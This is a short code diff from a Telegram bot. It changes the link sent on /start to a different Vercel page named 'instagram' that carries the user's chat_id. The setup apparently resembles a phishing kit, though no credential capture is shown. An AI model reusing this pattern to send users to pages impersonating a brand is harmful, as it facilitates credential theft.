@@ -111,7 +111,7 @@ async function getUpdates() {
         if (update.message && update.message.text === "/start") {
           const chat_id = update.message.chat.id;
           const user_name = update.message.from.first_name;
-          const link = `https://instagram-fcrmytia8-kahhorovs-projects.vercel.app/?chat_id=${chat_id}`;
+          const link = `https://instagram-six-beige.vercel.app//?chat_id=${chat_id}`;
 
           await fetch(`${TELEGRAM_API}/sendMessage`, {
             method: "POST",
